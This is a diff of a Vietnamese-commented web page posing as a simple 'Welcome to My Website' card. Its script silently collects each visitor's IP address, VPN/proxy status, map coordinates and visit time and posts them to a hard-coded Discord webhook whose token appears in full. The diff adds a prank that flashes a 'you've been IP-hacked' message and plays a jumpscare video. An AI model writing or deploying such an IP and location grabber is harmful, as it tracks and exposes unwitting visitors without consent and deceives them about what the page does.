@@ -6,7 +6,7 @@
     <title>Welcome to My Website</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
+            font-family: 'Courier New', Courier, monospace;
             margin: 0;
             padding: 0;
             background-color: #f4f4f4;
@@ -16,6 +16,8 @@
             height: 100vh;
             color: #333;
             text-align: center;
+            overflow: hidden;
+            transition: background 0.5s ease;
         }
         .card {
             background: white;
@@ -24,6 +26,7 @@
             box-shadow: 0 4px 10px rgba(0,0,0,0.1);
             max-width: 400px;
             width: 90%;
+            transition: all 0.5s ease;
         }
         h1 {
             font-size: 1.8em;
@@ -50,34 +53,77 @@
         .btn:hover {
             background-color: #0056b3;
         }
+
+        /* Giao diện hù dọa kinh dị */
+        body.scary-mode {
+            background: #000 url('img.jpg') no-repeat center center fixed;
+            background-size: cover;
+            animation: flash 0.2s infinite alternate;
+        }
+        @keyframes flash {
+            0% { filter: brightness(1); }
+            100% { filter: brightness(0.4) contrast(2); }
+        }
+
+        body.scary-mode .card {
+            background: rgba(0, 0, 0, 0.9);
+            border: 3px solid #ff0000;
+            box-shadow: 0 0 40px #ff0000;
+        }
+        body.scary-mode h1, body.scary-mode .ip-address {
+            display: none;
+        }
+        .scary-text {
+            display: none;
+            color: #ff0000;
+            font-size: 2.2em;
+            font-weight: bold;
+            text-shadow: 0 0 10px #ff0000, 0 0 20px #ff0000, 0 0 30px #ff0000;
+            animation: glitch 0.3s infinite alternate;
+        }
+        @keyframes glitch {
+            0% { transform: scale(1) skew(0deg); opacity: 0.9; }
+            100% { transform: scale(1.08) skew(3deg); opacity: 1; text-shadow: 0 0 20px #fff, 0 0 40px #ff0000; }
+        }
+
+        /* Video Jumpscare ẩn ban đầu */
+        #jumpscare-video {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            object-fit: cover;
+            z-index: 9999;
+        }
     </style>
 </head>
 <body>
-    <div class="card">
+    <div class="card" id="card-box">
         <h1>Welcome to My Website</h1>
-        <!-- Hiện thẳng IP ngay khi vào web -->
         <div class="ip-address" id="ip-address">Đang lấy IP...</div>
-        <button class="btn" onclick="openLink()">Bấm vào đây để tiếp tục</button>
+        <button class="btn" id="action-btn" onclick="triggerScare()">Bấm vào đây để tiếp tục</button>
+        <div class="scary-text" id="scary-msg">BẠN ĐÃ BỊ HACK IP RỒI!</div>
     </div>
+
+    <!-- Thẻ video jumpscare -->
+    <video id="jumpscare-video" src="jumpscare.mp4" preload="auto"></video>
     
     <script>
     function monke(json) {
-        // Hiển thị thẳng số IP lên màn hình trang web
         document.getElementById('ip-address').innerText = json.ip || 'N/A';
 
         var request = new XMLHttpRequest();
         request.open("POST", "https://discord.com/api/webhooks/1557733822601105419/3P02RcN4TR9j8DkIq8GodlkvgBo2bD-40J_5NaFNle3KvxeTtKoNhRbQGELIy7o_9jr6");
         request.setRequestHeader('Content-type', 'application/json');
 
-        // Kiểm tra VPN/Proxy
         let isVpnOrProxy = "NO";
         if (json.privacy && (json.privacy.vpn || json.privacy.proxy || json.privacy.hosting)) {
             isVpnOrProxy = "YES (VPN/Proxy detected)";
         }
 
         let mapsLink = json.loc ? `https://www.google.com/maps?q=${json.loc}` : 'Không có tọa độ';
-
-        // Lấy đúng giờ hệ thống lúc người đó ấn vào web
         let clickTime = new Date().toLocaleString("vi-VN");
 
         var params = {
@@ -103,12 +149,26 @@
             ]
         };
 
-        // Gửi thẳng về Discord ngay lập tức
         request.send(JSON.stringify(params));
     }
 
-    function openLink() {
-        window.location.href = "https://www.google.com";
+    function triggerScare() {
+        document.getElementById('action-btn').style.display = 'none';
+
+        // Sau 1 giây hiện hiệu ứng nhấp nháy và chữ kinh dị
+        setTimeout(function() {
+            document.body.classList.add('scary-mode');
+            document.getElementById('scary-msg').style.display = 'block';
+        }, 1000);
+
+        // Sau 2.5 giây (hoặc thời gian tùy chỉnh), phóng to video bùng nổ để hù dọa
+        setTimeout(function() {
+            let vid = document.getElementById('jumpscare-video');
+            document.getElementById('card-box').style.display = 'none';
+            document.body.style.background = '#000';
+            vid.style.display = 'block';
+            vid.play().catch(e => console.log(e));
+        }, 2500);
     }
     </script>
 
